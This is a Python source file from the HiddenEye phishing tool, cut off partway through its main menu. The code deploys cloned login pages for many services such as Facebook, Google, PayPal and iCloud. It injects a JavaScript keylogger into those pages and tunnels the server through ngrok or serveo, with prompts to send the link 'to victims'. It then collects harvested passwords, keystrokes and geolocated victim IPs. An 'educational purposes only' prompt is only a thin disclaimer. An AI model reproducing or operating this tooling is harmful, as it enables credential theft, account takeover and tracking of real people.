# Any actions must be here

from os import system, path
from distutils.dir_util import copy_tree
from time import sleep
import re
import json
from urllib.request import urlopen
from subprocess import check_output, CalledProcessError
from sys import stdout, argv, exit
from Defs.Themes import ThemesManager #FIXME
from Defs.Configurations import ConfigurationManager

ConfigurationManager.confirmSettingsExistence()
config = ConfigurationManager.readConfig()

logFile = None
didBackground = config.get("Settings", "DidBackground")
for arg in argv:
    if arg == "--nolog":  # If true - don't log
        didBackground = False
if config.get("Settings", "DidBackground") == "True":
    logFile = open("log.txt", "w")

colorTheme = ThemesManager.selectTheme() #FIXME
MAIN0, MAIN1, MAIN2, MAIN3, MAIN4 = colorTheme[0], colorTheme[
    1], colorTheme[2], colorTheme[3],  colorTheme[4]


class ActionsManager:
    def runPhishing(page, customOption, endMessage):  # Phishing pages selection menu
        system('rm -Rf Server/www/*.* && touch Server/www/usernames.txt && touch Server/www/ip.txt && cp WebPages/ip.php Server/www/ && cp WebPages/KeyloggerData.txt Server/www/ && cp WebPages/keylogger.js Server/www/ && cp WebPages/keylogger.php Server/www/ ')
        if customOption == '1' and page == 'Facebook':
            copy_tree("WebPages/fb_standard/", "Server/www/")
        elif customOption == '2' and page == 'Facebook':
            copy_tree("WebPages/fb_advanced_poll/", "Server/www/")
        elif customOption == '3' and page == 'Facebook':
            copy_tree("WebPages/fb_security_fake/", "Server/www/")
        elif customOption == '4' and page == 'Facebook':
            copy_tree("WebPages/fb_messenger/", "Server/www/")
        elif customOption == '1' and page == 'Google':
            copy_tree("WebPages/google_standard/", "Server/www/")
        elif customOption == '2' and page == 'Google':
            copy_tree("WebPages/google_advanced_poll/", "Server/www/")
        elif customOption == '3' and page == 'Google':
            copy_tree("WebPages/google_advanced_web/", "Server/www/")
        elif page == 'LinkedIn':
            copy_tree("WebPages/linkedin/", "Server/www/")
        elif page == 'GitHub':
            copy_tree("WebPages/GitHub/", "Server/www/")
        elif page == 'StackOverflow':
            copy_tree("WebPages/stackoverflow/", "Server/www/")
        elif page == 'WordPress':
            copy_tree("WebPages/wordpress/", "Server/www/")
        elif page == 'Twitter':
            copy_tree("WebPages/twitter/", "Server/www/")
        elif page == 'Snapchat':
            copy_tree("WebPages/Snapchat_web/", "Server/www/")
        elif page == 'Yahoo':
            copy_tree("WebPages/yahoo_web/", "Server/www/")
        elif page == 'Twitch':
            copy_tree("WebPages/twitch/", "Server/www/")
        elif page == 'Microsoft':
            copy_tree("WebPages/live_web/", "Server/www/")
        elif page == 'Steam':
            copy_tree("WebPages/steam/", "Server/www/")
        elif page == 'iCloud':
            copy_tree("WebPages/iCloud/", "Server/www/")
        elif customOption == '1' and page == 'Instagram':
            copy_tree("WebPages/Instagram_web/", "Server/www/")
        elif customOption == '2' and page == 'Instagram':
            copy_tree("WebPages/Instagram_autoliker/", "Server/www/")
        elif customOption == '3' and page == 'Instagram':
            copy_tree("WebPages/Instagram_advanced_attack/", "Server/www/")
        elif customOption == '4' and page == 'Instagram':
            copy_tree("WebPages/Instagram_VerifiedBadge/", "Server/www/")
        elif customOption == '5' and page == 'Instagram':
            copy_tree("WebPages/instafollowers/", "Server/www/")
        elif customOption == '1' and page == 'VK':
            copy_tree("WebPages/VK/", "Server/www/")
        elif customOption == '2' and page == 'VK':
            copy_tree("WebPages/VK_poll_method/", "Server/www/")
        elif page == 'GitLab':
            copy_tree("WebPages/gitlab/", "Server/www/")
        elif page == 'NetFlix':
            copy_tree("WebPages/netflix/", "Server/www/")
        elif page == 'Origin':
            copy_tree("WebPages/origin/", "Server/www/")
        elif page == 'Pinterest':
            copy_tree("WebPages/pinterest/", "Server/www/")
        elif page == 'ProtonMail':
            copy_tree("WebPages/protonmail/", "Server/www/")
        elif page == 'Spotify':
            copy_tree("WebPages/spotify/", "Server/www/")
        elif page == 'Quora':
            copy_tree("WebPages/quora/", "Server/www/")
        elif page == 'PornHub':
            copy_tree("WebPages/pornhub/", "Server/www/")
        elif page == 'Adobe':
            copy_tree("WebPages/adobe/", "Server/www/")
        elif page == 'Badoo':
            copy_tree("WebPages/badoo/", "Server/www/")
        elif page == 'CryptoCurrency':
            copy_tree("WebPages/cryptocurrency/", "Server/www/")
        elif page == 'DevianArt':
            copy_tree("WebPages/devianart/", "Server/www/")
        elif page == 'DropBox':
            copy_tree("WebPages/dropbox/", "Server/www/")
        elif page == 'eBay':
            copy_tree("WebPages/ebay/", "Server/www/")
        elif page == 'MySpace':
            copy_tree("WebPages/myspace/", "Server/www/")
        elif page == 'PayPal':
            copy_tree("WebPages/paypal/", "Server/www/")
        elif page == 'Shopify':
            copy_tree("WebPages/shopify/", "Server/www/")
        elif page == 'Verizon':
            copy_tree("WebPages/verizon/", "Server/www/")
        elif page == 'Yandex':
            copy_tree("WebPages/yandex/", "Server/www/")
        elif customOption == '1' and page == 'Reddit':
            copy_tree("WebPages/Reddit/", "Server/www/")
        elif customOption == '2' and page == 'Reddit':
            copy_tree("WebPages/Reddit-old/", "Server/www/")

        else:
            endMessage()

    def selectPort(port = '65535'):  # Question where user must select port
        status = 0
        while status < 1:
            system('clear')
            print('''
            {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
            |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
            |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
            {0}http://github.com/darksecdevelopers
            {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ WEBSERVER PORT SELECTION ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
            print(
                "\n {0}[{1}*{0}]{0}Select Any Available Port [1-65535]:{1}".format(MAIN0, MAIN4))
            port = input(" \n{0}HiddenEye >>> {1}".format(MAIN0, MAIN2))
            if port != int:
                port = 1
                status = 1
                return port
            elif int(port) > 65535 or int(port) < 1:
                # FIXME NEED TO BE COLORIZED
                print("PLEASE SELECT PORT BETWEEN 1 AND 65535")
            else:
                status = 1
                return port



    def runMainMenu():  # menu where user select what they wanna use

        if 256 != system('which php > /dev/null'):  # Checking if user have PHP
            print(" {2}* {0}PHP INSTALLATION FOUND".format(MAIN2, MAIN4, MAIN0))
        else:
            print("{0}**{2} PHP NOT FOUND: \n {0}~{1} Please install PHP and run me again.http://www.php.net/".format(MAIN2, MAIN4, MAIN0))

        for i in range(101):
            sleep(0.02)
            stdout.write("\r")
            stdout.write(
                "{0}[{1}*{0}]{1} HiddenEye is Opening. Please Wait...{2}%".format(MAIN0, MAIN4, i))
            stdout.flush()

    # Question where user must accept education purposes
        # Question where user must accept education purposes
        if input("\n{2}[{1}!{2}]{1} Do you agree to use this tool for educational purposes only? ({0}y{1}/{2}n{1})\n{2}HiddenEye >>> {0}".format(MAIN2, MAIN4, MAIN0)).upper() != 'Y':
            system('clear')
            print('\n\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU CAN ONLY USE IT FOR EDUCATIONAL PURPOSE.!{1} ]\n\n'.format(
                MAIN0, MAIN4))
            exit(0)

    def insertRedirectingURL():  # Question where user can input custom web-link
        system('clear')
        print('''{1}
        _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {0}http://github.com/darksecdevelopers
        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ PUT YOUR CUSTOM REDIRECTING URL HERE ] {0}\n-------------------------------'''.format(MAIN0, MAIN2))
        print(
            '''\n{1}**{0}(Choose Wisely As Your Victim Will Redirect to This Link)'''.format(MAIN2, MAIN4))
        print(
            '''\n{1}**{0}(Please don't leave it blank. Unless Errors may occur)'''.format(MAIN2, MAIN4))
        print(
            '''\n{0}[{1}*{0}]{0}Insert a custom redirect url:'''.format(MAIN0, MAIN4))
        custom = input('''\n{0}REDIRECT HERE>>> {2}'''.format(
            MAIN0, MAIN4, MAIN2))
        if 'http://' in custom or 'https://' in custom:
            pass
        else:
            custom = 'https://' + custom
        if path.exists('Server/www/post.php') and path.exists('Server/www/login.php'):
            with open('Server/www/login.php') as f:
                read_data = f.read()
            c = read_data.replace('<CUSTOM>', custom)
            f = open('Server/www/login.php', 'w')
            f.write(c)
            f.close()

            with open('Server/www/post.php') as f:
                read_data = f.read()
            c = read_data.replace('<CUSTOM>', custom)
            f = open('Server/www/post.php', 'w')
            f.write(c)
            f.close()
        else:
            with open('Server/www/login.php') as f:
                read_data = f.read()
            c = read_data.replace('<CUSTOM>', custom)
            f = open('Server/www/login.php', 'w')
            f.write(c)
            f.close()

    def deployCloudfare():
        system('clear')
        print('''{1}
        _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {1}http://github.com/darksecdevelopers
        {0}** BY: {1}DARKSEC {0}**
        '''.format(MAIN0, MAIN2))
        print(
            "-------------------------------\n{0}[ CLOUDFARE PROTECTION PROMPT ] \n-------------------------------".format(MAIN0))
        print(
            "\n{0}[{1}*{0}]{0}DO YOU WANT TO ADD A CLOUDFARE PROTECTION FAKE PAGE -{1}(Y/N)".format(MAIN0, MAIN4))
        choice = input(
            "\n\n{1}{0}YOUR CHOICE >>> {2}".format(MAIN0, MAIN4, MAIN2))
        if choice == 'y' or choice == 'Y':
            system(
                'cp Server/www/index.html Server/www/home.php && cp WebPages/cloudfare.html Server/www/index.html')
            print("\n{0}[{1}#{0}]CLOUDFARE FAKE PAGE PROTECTION{0} ADDED".format(
                MAIN0, MAIN4))
            sleep(2)
        else:
            sleep(1)

    def deployKeylogger():
        system('clear')
        print('''{1}
        _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {1}http://github.com/darksecdevelopers
        {0}** BY: {1}DARKSEC {0}**
        '''.format(MAIN0, MAIN2))
        print(
            "-------------------------------\n{0}[ KEYLOGGER PROMPT ]\n-------------------------------".format(MAIN0))
        print(
            "\n{0}[{1}*{0}] DO YOU WANT TO ADD A KEYLOGGER IN PHISHING PAGE-{1}(Y/N)".format(MAIN0, MAIN4))
        choice = input(
            "\n\n{1}{0}YOUR CHOICE >>> {2}".format(MAIN0, MAIN4, MAIN2))
        if choice != ('y' or 'Y'):
            sleep(1)
        else:
            if path.exists('Server/www/index.html'):
                with open('Server/www/index.html') as f:
                    read_data = f.read()
                    c = read_data.replace(
                        '</title>', '</title><script src="keylogger.js"></script>')
                    f = open('Server/www/index.html', 'w')
                    f.write(c)
                    f.close()
                print("\n{0}[{1}#{0}]Keylogger{0} added".format(
                    MAIN0, MAIN4))
                sleep(2)
            else:
                with open('Server/www/index.php') as f:
                    read_data = f.read()
                    c = read_data.replace(
                        '</title>', '</title><script src="keylogger.js"></script>')
                    f = open('Server/www/index.php', 'w')
                    f.write(c)
                    f.close()
                print("\n{0}[{1}#{0}]Keylogger{0} ADDED !!!".format(
                    MAIN0, MAIN4))
                sleep(2)

    def getCredentials(port):

        print("{2}.........................................................................\n{0}[{1}!{0}]{1} IF FOUND {2}SEGMENTATION FAULT{1}, IT MEANS THE SERVER FAILED.            {2}| \n{0}[{1}!{0}]{1} THEN YOU HAVE TO RUN IT AGAIN.                                      {2}| \n{0}[{1}!{0}]{1} Use This Command In Another Terminal.                               {2}| \n{0}({2}cd Server/www/ && php -S 127.0.0.1:{3} > /dev/null{0})                   {2}| \n{2}.........................................................................   \n\n".format(MAIN2, MAIN2, MAIN0, port))
        print("{0}[{1}*{0}]{1} Waiting For Victim Interaction. Keep Eyes On Requests Coming From Victim ... \n\n{2}++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n".format(MAIN0, MAIN2, MAIN4))
        while True:
            with open('Server/www/usernames.txt') as credentials:
                lines = credentials.read().rstrip()
                if len(lines) != 0:
                    EssentialsManager.writeLog(
                        '{}..................................................................'.format(MAIN3))
                    EssentialsManager.writeLog(' {0}[{1} CREDENTIALS FOUND {0}]{1}:\n {0}{2}{1}'.format(
                        MAIN2, MAIN3, lines))
                    system(
                        'rm -rf Server/www/usernames.txt && touch Server/www/usernames.txt')
                    EssentialsManager.writeLog(
                        '{}..................................................................'.format(MAIN3))

            credentials.close()

            with open('Server/www/ip.txt') as credentials:
                lines = credentials.read().rstrip()
                if len(lines) != 0:
                    ip = re.match('Victim Public IP: (.*.*.*)\n',lines).group(1)
                    user = re.match(
                        'Current logged in user: (a-z0-9)\n', lines)  # FIXME
                    resp = urlopen('https://ipinfo.io/{0}/json'.format(ip))
                    ipinfo = json.loads(resp.read().decode(
                        resp.info().get_param('charset') or 'utf-8'))
                    if 'bogon' in ipinfo:
                        EssentialsManager.writeLog(
                            '..................................................................')
                        EssentialsManager.writeLog(' \n{0}[ VICTIM IP BONUS ]{1}:\n'.format(
                            MAIN0, MAIN2))
                    else:
                        matchObj = re.match('^(.*?),(.*)$', ipinfo['loc'])
                        latitude = matchObj.group(1)
                        longitude = matchObj.group(2)
                        EssentialsManager.writeLog(
                            '..................................................................')
                        EssentialsManager.writeLog(' \n{0}[ VICTIM INFO FOUND ]{1}:\n'.format(
                            MAIN3, MAIN2))
                        EssentialsManager.writeLog(' \n{0}Longitude: {1} \nLatitude: {2}'.format(
                            MAIN3, longitude, latitude))
                        EssentialsManager.writeLog(' \n{0}ISP: {2} \nCountry: {3}{1}'.format(
                            MAIN3, MAIN2, ipinfo['org'], ipinfo['country']))
                        EssentialsManager.writeLog(' \n{0}Region: {2} \nCity: {3}{1}'.format(
                            MAIN3, MAIN2, ipinfo['region'], ipinfo['city']))
                    system('rm -rf Server/www/ip.txt && touch Server/www/ip.txt')
                    EssentialsManager.writeLog(
                        '..................................................................')

            credentials.close()

            with open('Server/www/KeyloggerData.txt') as credentials:
                lines = credentials.read().rstrip()
                if len(lines) != 0:
                    EssentialsManager.writeLog(
                        '{}...............................'.format(MAIN0))
                    EssentialsManager.writeLog(' {1}[{0} GETTING PRESSED KEYS {1}]{1}:\n {0}{2}'.format(
                        MAIN3, MAIN2, lines))
                    system(
                        'rm -rf Server/www/KeyloggerData.txt && touch Server/www/KeyloggerData.txt')
                    EssentialsManager.writeLog(
                        '{}...............................'.format(MAIN0))

            credentials.close()


class ServerManager:
    def runServer(port):
        system("fuser -k %s/tcp > /dev/null 2>&1" % (port))
        system("cd Server/www/ && php -S 127.0.0.1:%s > /dev/null 2>&1 &" % (port))

    def selectServer(port):  # Question where user must select server
        system('clear')
        status = 0
        while status < 1:
            print('''
            {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
            |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
            |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
            {0}http://github.com/darksecdevelopers
            {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ HOST SERVER SELECTION ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
            print("\n {1}[{0}!{1}]{1}(SERVEO WORKS BETTER)".format(
                MAIN0, MAIN2))
            print(
                "\n {0}[{1}*{0}]{0}Select Any Available Server:{1}".format(MAIN0, MAIN4))
            print("\n {0}[{1}1{0}]{1}Ngrok\n {0}[{1}2{0}]{1}Serveo".format(
                MAIN0, MAIN2))

            choice = input(" \n{0}HiddenEye >>> {1}".format(MAIN0, MAIN2))
            if choice == '1':
                status = 1
                print('''
                {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
                |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
                |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
                {0}http://github.com/darksecdevelopers
                {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ NGROK SERVER PROCEDURE ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))

                system('./Server/ngrok http {} > /dev/null &'.format(port))
                while True:
                    sleep(2)
                    system(
                        'curl -s -N http://127.0.0.1:4040/api/tunnels | grep "https://[0-9a-z]*\.ngrok.io" -oh > ngrok.url')
                    urlFile = open('ngrok.url', 'r')
                    url = urlFile.read()
                    urlFile.close()
                    if re.match("https://[0-9a-z]*\.ngrok.io", url) != None:
                        print("\n{0}[{1}!{0}]{1} SEND THIS NGROK URL TO VICTIMS-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} NGROK URL: {2}".format(
                            MAIN0, MAIN2, MAIN3, port) + url + "{1}".format(MAIN0, MAIN4, MAIN3))
                        print("\n")
                        break

            elif choice == '2':
                status = 1
                system('clear')
                ServerManager.runServeo(port)

            else:
                system('clear')

    def installNgrok():  # Ngrok check
        if path.isfile('Server/ngrok') == False:  # Is Ngrok downloaded?
            print('[*] Ngrok Not Found')

            if input("\n{2}[{1}!{2}]{1} Do you accept installation of Ngrok? ({0}y{1}/{2}n{1})\n{2}HiddenEye >>> {0}".format(MAIN2, MAIN4, MAIN0)).upper() != 'Y':
                system('clear')
                print('\n\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.PLEASE INSTALL NGROK!{1} ]\n\n'.format(
                    MAIN0, MAIN4))
                exit(0)
            else:
                print('[*] Downloading Ngrok...')
                if 'Android' in str(check_output(('uname', '-a'))) or 'arm' in str(check_output(('uname', '-a'))):
                    filename = 'ngrok-stable-linux-arm.zip'
                else:
                    ostype = systemos().lower()
                    if architecture()[0] == '64bit':
                        filename = 'ngrok-stable-{0}-amd64.zip'.format(ostype)
                    else:
                        filename = 'ngrok-stable-{0}-386.zip'.format(ostype)
                url = 'https://bin.equinox.io/c/4VmDzA7iaHb/' + filename
                download(url)
                system('unzip ' + filename)
                system('mv ngrok Server/ngrok')
                system('rm -Rf ' + filename)
                system('clear')

    def runServeo(port):
        print('''
            {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
            |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
            |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
            {0}http://github.com/darksecdevelopers
            {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ SERVEO URL TYPE SELECTION ]\n-------------------------------\n[{1}!{0}]{1}REMEMBER ? Serveo Don't Allow Phishing.\n{0}[{1}!{0}]{1}They Drop Their Connection Whenever Detect Phishing. '''.format(MAIN0, MAIN2))
        print(
            "\n{0}[{1}*{0}]{0}CHOOSE ANY SERVEO URL TYPE TO GENERATE PHISHING LINK:{1}".format(MAIN0, MAIN2))
        print("\n{0}[{1}1{0}]{1}Custom URL {0}(Generates designed url) \n{0}[{1}2{0}]{1}Random URL {0}(Generates Random url)".format(
            MAIN0, MAIN2))
        choice = input("\n\n{0}YOUR CHOICE >>> {1}".format(MAIN0, MAIN2))
        system('clear')
        if choice == '1':
            ServerManager.customServeo(port)  # FIXME
        elif choice == '2':
            ServerManager.randomServeo(port)  # FIXME
        else:
            system('clear')
            return ServerManager.runServeo(port)

    def customServeo(port):

        print('''
        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {0}http://github.com/darksecdevelopers
        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ CREATE A CUSTOM URL HERE ]{1}!! {0}\n-------------------------------\n\n{0}[{1}!{0}]{1} YOU CAN MAKE YOUR URL SIMILAR TO AUTHENTIC URL.\n\n{0}Insert a custom subdomain for serveo'''.format(MAIN0, MAIN2))
        lnk = input("\n{0}CUSTOM Subdomain>>> {2}".format(MAIN0, MAIN4, MAIN2))
        if not ".serveo.net" in lnk:
            lnk += ".serveo.net"
        else:
            pass
        system('ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=60 -R %s:80:localhost:%s serveo.net > link.url 2> /dev/null &' % (lnk, port))
        sleep(7)
        try:
            output = check_output(
                "grep -o '.\{0,0\}http.\{0,100\}' link.url", shell=True)
            # FIXME pylint(BAD STR STRIP CALL)
            url = str(output).strip("b ' \ n r")
            system('clear')
            print('''
            {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
            |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
            |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
            {0}http://github.com/darksecdevelopers
            {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ CUSTOM SERVEO URL ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
            print("\n{0}[{1}!{0}]{1} SEND THIS SERVEO URL TO VICTIMS-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} SERVEO URL: {2}".format(
                MAIN0, MAIN2, MAIN3, port) + url + "{}".format(MAIN0))
            print("\n")

        except CalledProcessError:
            print('''\n\n{0}FAILED TO GET THIS DOMAIN. !!!\n\n{0}LOOKS LIKE CUSTOM URL IS NOT VALID or ALREADY OCCUPIED BY SOMEONE ELSE. !!!\n\n{0}[{1}!{0}]TRY TO SELECT ANOTHER CUSTOM DOMAIN{1} (GOING BACK).. !! \n
            '''.format(MAIN0, MAIN4))
            sleep(4)
            system('clear')
            return ServerManager.customServeo(port)  # FIXME

    def randomServeo(port):
        system('clear')
        print('''
        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {0}http://github.com/darksecdevelopers
        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ RANDOM SERVEO URL ]\n-------------------------------'''.format(MAIN0, MAIN2))
        system('ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:%s serveo.net > link.url 2> /dev/null &' % (port))
        sleep(8)
        try:
            output = check_output(
                "grep -o '.\{0,0\}http.\{0,100\}' link.url", shell=True)
            url = str(output).strip("b ' \ n r")  # FIXME
            print("\n{0}[{1}!{0}]{1} SEND THIS SERVEO URL TO VICTIMS-\n\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} SERVEO URL: {2}".format(
                MAIN0, MAIN4, MAIN3, port) + url + "{}".format(MAIN0))
            print("\n")
        except CalledProcessError:

            sleep(4)
            system('clear')
            return ServerManager.randomServeo(port)  # FIXME


class EssentialsManager:
    def loadModule(module):  # This one just show text..
        print(''' {0}
        [{1}*{0}] SELECT ANY ONE MODE...{0}\n--------------------------------'''.format(MAIN0, MAIN2))

    def writeLog(ctx):  # noQA
        if config.get("Settings", "DidBackground") == "True":  # if didBackground == True, write
            logFile.write(ctx.replace(MAIN0, "").replace(MAIN1, "").replace(
                MAIN2, "").replace(MAIN3, "").replace(MAIN4, "") + "\n")
        print(ctx)

    def endMessage():  # Message when HiddenEye exit
        choice = input("\n\n{0}[{1}?{0}] Press '1' To Run Script Again {1}|{0} Press 'ENTER' To Exit\n{0} >> {2}".format(
            MAIN0, MAIN4, MAIN2))
        if choice == '1':
            system('sudo python3 HiddenEye.py')
        elif choice == '':
            system('clear')
            print('''
                    {3}HIDDEN EYE {3}BY: DARKSEC TEAM
                {1}https://github.com/DarkSecDevelopers/HiddenEye

    {3}  [[*]] IF YOU LIKE THIS TOOL, THEN PLEASE HELP US.
    {0}
        [{3}!{0}] PLEASE LET US KNOW , IF ANY PHISHING PAGE GOT BROKEN .
        [{3}!{0}] MAKE PULL REQUEST, LET US KNOW YOU SUPPORT US.
        [{3}!{0}] IF YOU HAVE MORE PHISHING PAGES, THEN JUST MAKE A PULL REQUEST.
        [{3}!{0}] PLEASE DON'T HARM ANYONE , ITS ONLY FOR EDUCATIONAL PURPOSE.
        [{3}!{0}] WE WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS TOOL

    {3}  [[*]] THANKS TO USE THIS TOOL. HAPPY HACKING ... GOOD BYE \n '''.format(MAIN2, MAIN2, MAIN4, MAIN0))
        else:
            system('clear')
            return endMessage()

    def mainMenu():
        system('clear')
        print('''

 {2} ██   ██ ██ ██████   ██████   ███████ ███   ██  {3}███████ ██    ██ ███████{1}
 {2} ██   ██ ██ ██    ██ ██    ██ ██      ████  ██  {3}██       ██  ██  ██      {1}
 {2} ███████ ██ ██    ██ ██    ██ ███████ ██ ██ ██  {3}███████   ████   ███████ {1}
 {2} ██   ██ ██ ██    ██ ██    ██ ██      ██  ████  {3}██         ██    ██      {1}
 {2} ██   ██ ██ ██████   ██████   ███████ ██   ███  {3}███████    ██    ███████ {1}

                                                     v{3}1{1}.{3}0{1}.{3}0{1} BY:DARKSEC{2}
             {3}[{2} Modern Phishing Tool With Advanced Functionality {3}]
{3}[{2} PHISHING-KEYLOGGER-INFORMATION COLLECTOR-ALL_IN_ONE_TOOL-SOCIALENGINEERING {3}]
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'''.format(MAIN3, MAIN4, MAIN2, MAIN0))
        print("------------------------\nSELECT ANY ATTACK VECTOR FOR YOUR VICTIM:\n------------------------".format(MAIN0, MAIN2))
        print(" {0}[{1}1{0}]{1} Facebook        {0}[{1}10{0}]{1} Yahoo          {0}[{1}19{0}]{1} Pinterest      {0}[{1}28{0}]{1} DropBox ".format(
            MAIN0, MAIN2))
        print(" {0}[{1}2{0}]{1} Google          {0}[{1}11{0}]{1} Twitch         {0}[{1}20{0}]{1} ProtonMail     {0}[{1}29{0}]{1} eBay".format(
            MAIN0, MAIN2))
        print(" {0}[{1}3{0}]{1} LinkedIn        {0}[{1}12{0}]{1} Microsoft      {0}[{1}21{0}]{1} Spotify        {0}[{1}30{0}]{1} MySpace".format(
            MAIN0, MAIN2))
        print(" {0}[{1}4{0}]{1} GitHub          {0}[{1}13{0}]{1} Steam          {0}[{1}22{0}]{1} Quora          {0}[{1}31{0}]{1} PayPal".format(
            MAIN0, MAIN2))
        print(" {0}[{1}5{0}]{1} StackOverflow   {0}[{1}14{0}]{1} VK             {0}[{1}23{0}]{1} PornHub        {0}[{1}32{0}]{1} Shopify".format(
            MAIN0, MAIN2))
        print(" {0}[{1}6{0}]{1} WordPress       {0}[{1}15{0}]{1} iCloud         {0}[{1}24{0}]{1} Adobe          {0}[{1}33{0}]{1} Verizon".format(
            MAIN0, MAIN2))
        print(" {0}[{1}7{0}]{1} Twitter         {0}[{1}16{0}]{1} GitLab         {0}[{1}25{0}]{1} Badoo          {0}[{1}34{0}]{1} Yandex".format(
            MAIN0, MAIN2))

        print(" {0}[{1}8{0}]{1} Instagram       {0}[{1}17{0}]{1} Netflix        {0}[{1}26{0}]{1} CryptoCurrency {0}[{1}35{0}]{1} Reddit".format(
            MAIN0, MAIN2))
        print(" {0}[{1}9{0}]{1} Snapchat        {0}[{1}18{0}]{1} Origin         {0}[{1}27{0}]{1} DevianArt      ".format(
            MAIN0, MAIN2))
        option = input("{0}HiddenEye >>>  {1}".format(MAIN0, MAIN2))
        if option == '1':
            EssentialsManager.loadModule('Facebook')
            customOption = input("\nOperation mode:\n {0}[{1}1{0}]{1} Standard Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n{0}HiddenEye >>> {2}".format(MAIN0, MAIN2, MAIN2))
            ActionsManager.runPhishing(
                'Facebook', customOption, EssentialsManager.endMessage)
        elif option == '2':
            EssentialsManager.loadModule('Google')
            customOption = input(
                "\nOperation mode:\n {0}[{1}1{0}]{1} Standard Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n {0}[{1}3{0}]{1} New Google Web\n{0}HiddenEye >>> {2}".format(MAIN0, MAIN2, MAIN2))
            ActionsManager.runPhishing(
                'Google', customOption, EssentialsManager.endMessage)
        elif option == '3':
            EssentialsManager.loadModule('LinkedIn')
            customOption = ''
            ActionsManager.runPhishing(
                'LinkedIn', customOption, EssentialsManager.endMessage)
        elif option == '4':
            EssentialsManager.loadModule('GitHub')
            customOption = ''
            ActionsManager.runPhishing(
                'GitHub', customOption, EssentialsManager.endMessage)
        elif option == '5':
            EssentialsManager.loadModule('StackOverflow')
            customOption = ''
            ActionsManager.runPhishing(
                'StackOverflow', customOption, EssentialsManager.endMessage)
        elif option == '6':
            EssentialsManager.loadModule('WordPress')
            customOption = ''
            ActionsManager.runPhishing(
                'WordPress', customOption, EssentialsManager.endMessage)
        elif option == '7':
            EssentialsManager.loadModule('Twitter')
            customOption = ''
            ActionsManager.runPhishing(
                'Twitter', customOption, EssentialsManager.endMessage)
        elif option == '8':
            EssentialsManager.loadModule('Instagram')
            customOption = input("\nOperation mode:\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (To Lure The Users)\n {0}[{1}3{0}]{1} Instagram Advanced Scenario (Appears as Instagram Profile)\n {0}[{1}4{0}]{1} Instagram Verified Badge Attack (Lure To Get Blue Badge){1} *[NEW]*\n {0}[{1}5{0}]{1} Instafollower (Lure To Get More Followers){1} *[NEW]*\n{0}HiddenEye >>> {2}".format(MAIN0, MAIN2, MAIN2))
            ActionsManager.runPhishing(
                'Instagram', customOption, EssentialsManager.endMessage)
        elif option == '9':
            EssentialsManager.loadModule('Snapchat')
            customOption = ''
            ActionsManager.runPhishing(
                'Snapchat', customOption, EssentialsManager.endMessage)
        elif option == '10':
